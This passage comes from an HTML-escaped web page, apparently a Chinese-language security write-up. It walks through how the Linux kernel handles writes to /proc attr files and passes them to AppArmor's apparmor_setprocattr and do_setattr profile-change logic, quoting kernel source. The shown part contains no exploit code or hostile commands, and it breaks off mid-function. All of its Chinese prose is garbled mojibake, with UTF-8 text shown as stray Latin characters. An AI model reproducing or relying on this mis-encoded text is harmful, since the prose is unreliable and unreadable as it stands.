    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;fscreate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;keycreate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;sockcreate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;DIR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;smack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0555&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;proc_smack_attr_dir_inode_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_smack_attr_dir_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;DIR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apparmor&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0555&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;proc_apparmor_attr_dir_inode_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_apparmor_attr_dir_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è®Šæ•¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proc_pid_attr_operations&lt;/code&gt; æ˜¯é€™äº›æª”æ¡ˆæ‰€ä½¿ç”¨çš„æª”æ¡ˆæ“ä½œè¡¨ï¼Œå…¶ä¸­å¯«å…¥è¡Œç‚ºæœƒç”±å‡½å¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proc_pid_attr_write()&lt;/code&gt; [6] è™•ç†ã€‚å¾€ä¸‹è¿½è¹¤é€™å€‹å‡½å¼çš„å¯¦ä½œï¼Œå¯ä»¥çœ‹åˆ°å®ƒæœƒå‘¼å« LSM ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setprocattr&lt;/code&gt; hookï¼Œè€Œå°æ‡‰åˆ° AppArmor çš„å¯¦ä½œå°±æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_setprocattr()&lt;/code&gt; [7]ã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_operations&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_pid_attr_operations&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_pid_attr_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [6]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_pid_attr_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                   &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loff_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROC_I&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------------&lt;/span&gt;
                  &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dentry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                  &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;security_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_hook_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;hlist_for_each_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;security_hook_heads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------------&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_hook_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_hooks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__ro_after_init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LSM_HOOK_INIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [7]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å‡½å¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_setprocattr()&lt;/code&gt; é¦–å…ˆæœƒå°‡ç›®æ¨™å±¬æ€§çš„åç¨±è½‰æ›æˆå°æ‡‰çš„åˆ—èˆ‰å€¼ [8]ï¼Œæ¥è‘—å†å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_setattr()&lt;/code&gt; ä¾†å¯¦éš›è™•ç†è©²æ“ä½œ [9]ã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apparmor_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsm_name_to_attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [8]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do_setattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [9]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;lsm_name_to_attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_CURRENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_setattr()&lt;/code&gt; å‡½å¼æœƒå…ˆæ˜¯è§£æå¯«å…¥çš„è¼¸å…¥è³‡æ–™ï¼Œå…¶æ ¼å¼ç‚ºï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&amp;lt;æ“ä½œ&amp;gt; &amp;lt;è¨­å®šæª”åç¨±&amp;gt;&quot;&lt;/code&gt;ã€‚æ¥è‘—ï¼Œå®ƒæœƒæ ¹æ“šè¢«å¯«å…¥çš„æª”æ¡ˆèˆ‡æ“ä½œç¨®é¡ï¼Œä¾†æ±ºå®šå‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_change_profile()&lt;/code&gt; æ™‚æ‰€ä½¿ç”¨çš„åƒæ•¸ï¼Œä»¥åŸ·è¡Œå°æ‡‰çš„è¨­å®šæª”åˆ‡æ›æˆ–æ“ä½œã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_setattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_CURRENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;changeprofile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_NOFLAGS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;permprofile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_TEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;stack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
